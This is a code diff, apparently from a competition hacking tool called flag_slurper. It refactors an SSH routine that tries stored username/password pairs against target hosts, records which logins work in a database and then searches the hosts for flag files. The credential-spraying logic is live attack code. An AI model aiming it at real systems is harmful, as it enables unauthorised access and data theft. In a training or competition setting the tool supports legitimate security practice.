@@ -1,12 +1,13 @@
+import os
+import pprint
 from typing import Tuple
 
-import os
 import paramiko
 
 from flag_slurper.autolib.exploit import get_file_contents
-from .credentials import credential_bag, flag_bag
+from .credentials import flag_bag
 from .exploit import find_flags, FlagConf
-from .models import Service
+from .models import Service, CredentialBag, Credential
 
 
 def _get_ssh_client():
@@ -21,12 +22,20 @@ def pwn_ssh(url: str, port: int, service: Service, flag_conf: FlagConf) -> Tuple
     enable_search = flag_conf['search'] if flag_conf else True
 
     working = set()
-    for credential in credential_bag.credentials():
+    credentials = CredentialBag.select()
+    for credential in credentials:
+        try:
+            cred = credential.credentials.where(Credential.service == service).get()
+        except Credential.DoesNotExist:
+            cred = Credential.create(service=service, state=Credential.REJECT, bag=credential)
+
         try:
             with ssh:
-                ssh.connect(url, port=port, username=credential.username, password=credential.password, look_for_keys=False)
-                credential.mark_works(service)
-                working.add(credential)
+                ssh.connect(url, port=port, username=credential.username, password=credential.password,
+                            look_for_keys=False)
+                cred.state = Credential.WORKS
+                cred.save()
+                working.add(cred)
 
                 if flag_conf:
                     location = flag_conf['name']
@@ -41,7 +50,6 @@ def pwn_ssh(url: str, port: int, service: Service, flag_conf: FlagConf) -> Tuple
                     for flag in flags:
                         flag_bag.add_flag(service, flag)
         except:
-            credential.mark_rejected(service)
             continue
 
     if working:
